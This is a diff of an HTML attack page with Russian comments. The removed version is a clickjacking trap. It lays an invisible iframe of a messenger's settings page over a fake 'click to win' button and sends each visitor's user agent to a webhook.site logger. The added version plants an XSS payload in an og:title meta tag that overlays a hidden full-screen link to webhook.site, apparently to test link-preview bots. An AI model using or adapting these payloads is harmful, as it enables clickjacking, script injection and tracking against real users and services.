@@ -1,46 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        /* Слой с твоим ловушечным сайтом (прозрачный) */
-        #victim-iframe {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            opacity: 0.0; /* ДЕЛАЕТ ВСЁ НЕВИДИМЫМ */
-            z-index: 2;
-        }
-        /* Слой, который видит пользователь (приманка) */
-        #decoy-content {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #fff;
-        }
-        .btn-fake {
-            padding: 20px;
-            background: #007bff;
-            color: white;
-            border-radius: 8px;
-            font-family: sans-serif;
-        }
-    </style>
+    <meta property="og:title" content='"> <img src=x onerror="
+        (function(){
+            if(window.hacked) return;
+            window.hacked = true;
+            var a = document.createElement('a');
+            a.href = 'https://webhook.site/your-id';
+            a.style = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0.01;background:red';
+            a.onclick = function(){ this.remove(); };
+            document.body.appendChild(a);
+        })()
+    ">'>
+    <meta property="og:description" content="Обычное описание">
 </head>
 <body>
-    <div id="decoy-content">
-        <div class="btn-fake">НАЖМИ ЧТОБЫ ВЫИГРАТЬ</div>
-    </div>
-
-    <iframe id="victim-iframe" src="https://web.max.ru/settings"></iframe>
-
-    <script>
-        // Твой логгер тоже сработает при загрузке
-        const hook = "https://webhook.site/8cda2992-b523-4748-a5a4-616893cf1435";
-        new Image().src = hook + "/VISIT_DETECTED?ua=" + btoa(navigator.userAgent);
-    </script>
+    Если ты это видишь, бот не исполнил скрипт в превью.
 </body>
 </html>
